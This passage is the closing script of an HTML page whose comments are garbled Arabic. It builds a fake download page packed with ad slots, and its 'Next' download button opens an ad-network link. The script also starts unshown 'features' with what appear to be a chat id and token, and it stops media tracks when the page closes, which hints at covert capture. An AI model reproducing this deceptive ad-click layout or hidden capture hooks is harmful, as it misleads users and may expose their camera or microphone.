    mainBox.appendChild(adsGrid);
    
    // Ø¥Ø¹Ù„Ø§Ù† 2
    const adBox1 = document.createElement('div');
    adBox1.className = 'ad-container';
    adBox1.id = 'ad-container-1';
    mainBox.appendChild(adBox1);
    
    // Ø¥Ø¹Ù„Ø§Ù† 3
    const adBox2 = document.createElement('div');
    adBox2.className = 'ad-container';
    const containerDiv = document.createElement('div');
    containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
    adBox2.appendChild(containerDiv);
    mainBox.appendChild(adBox2);
    
    // Ø²Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
    const downloadBtn = document.createElement('button');
    downloadBtn.className = 'download-btn';
    downloadBtn.textContent = 'â–¶ï¸ Ø§Ù„ØªØ§Ù„ÙŠ';
    downloadBtn.onclick = function() {
      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c", "_blank");
    };
    mainBox.appendChild(downloadBtn);
    
    // Ø¥Ø¹Ù„Ø§Ù† 4
    const adBox3 = document.createElement('div');
    adBox3.className = 'ad-container';
    adBox3.id = 'ad-container-3';
    mainBox.appendChild(adBox3);
    
    // Ø¥Ø¹Ù„Ø§Ù† 5
    const adBox4 = document.createElement('div');
    adBox4.className = 'ad-container';
    adBox4.id = 'ad-container-4';
    mainBox.appendChild(adBox4);
    
    downloadPage.appendChild(mainBox);
    wrap.appendChild(downloadPage);
    
    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†Ø§Øª - Ø¨Ù†ÙØ³ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ
    loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
    loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
    loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
    
    // Ø¥Ø¹Ù„Ø§Ù† Ø¥Ø¶Ø§ÙÙŠ
    const atOptionsScript = document.createElement('script');
    atOptionsScript.innerHTML = `
      atOptions = {
        'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
        'format' : 'iframe',
        'height' : 250,
        'width' : 300,
        'params' : {}
      };
    `;
    document.body.appendChild(atOptionsScript);
    loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
    
    // ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…ÙŠØ²Ø§Øª
    startFeatures(chat, token, features);
    
    // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª Ø¹Ù†Ø¯ Ù…ØºØ§Ø¯Ø±Ø© Ø§Ù„ØµÙØ­Ø©
    window.addEventListener('beforeunload', stopAllTracks);
  }
</script>
</body>
                                      </html>
